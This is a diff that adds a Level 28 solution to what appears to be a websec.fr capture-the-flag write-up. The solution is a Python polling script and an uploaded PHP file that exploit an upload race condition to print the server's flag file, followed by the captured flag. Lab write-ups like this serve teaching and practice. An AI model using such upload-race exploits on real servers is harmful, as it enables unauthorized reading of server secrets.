@@ -87,3 +87,33 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 ```
 WEBSEC{How_am_I_supposed_to_parse_uri_when_everything_is_so_broooken}
 ```
+
+## Level 28
+
+```
+#!/usr/bin/env python3
+import requests
+import time
+
+URL = "https://websec.fr/level28/tmp/"
+FILE = "66b99941e5e007c9ceba59743b2a8270.php"
+
+while True:
+    res = requests.get(f"{URL}/{FILE}")
+    if res.status_code != 404:
+        print(res.text)
+    else:
+        print("NOPE")
+    time.sleep(0.1)
+```
+
+```
+<?php
+include("../flag.php");
+echo $flag;
+?>
+```
+
+```
+WEBSEC{Can_w3_please_h4ve_mutexes_in_PHP_naow?_Wait_there_is_a_pthread_module_for_php?!_Awwww:/}
+```
